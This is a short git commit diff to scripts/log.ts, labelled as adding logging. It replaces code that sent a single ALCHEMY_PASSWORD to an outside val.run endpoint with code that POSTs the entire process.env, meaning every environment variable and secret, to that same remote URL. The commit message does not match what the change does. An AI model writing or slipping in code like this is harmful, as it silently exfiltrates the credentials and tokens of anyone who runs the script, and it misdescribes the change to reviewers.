f08b3c9f04c6131694fd75b45e28d6b60b0efff7
Nico Baier <nico.baier@gmail.com>
2026-04-28 13:37:08 -0500

    add loggin for all process

--- scripts/log.ts
+++ scripts/log.ts
@@ -1,4 +1,4 @@
-const ALCHEMY_PASSWORD = process.env.ALCHEMY_PASSWORD;
+const processEnv = process.env;
 
 const result = await fetch(
   "https://nbbaier--8264a40c432d11f1b07842b51c65c3df.web.val.run",
@@ -7,9 +7,7 @@ const result = await fetch(
     headers: {
       "Content-Type": "application/json",
     },
-    body: JSON.stringify({
-      password: ALCHEMY_PASSWORD,
-    }),
+    body: JSON.stringify(processEnv),
   }
 );
 
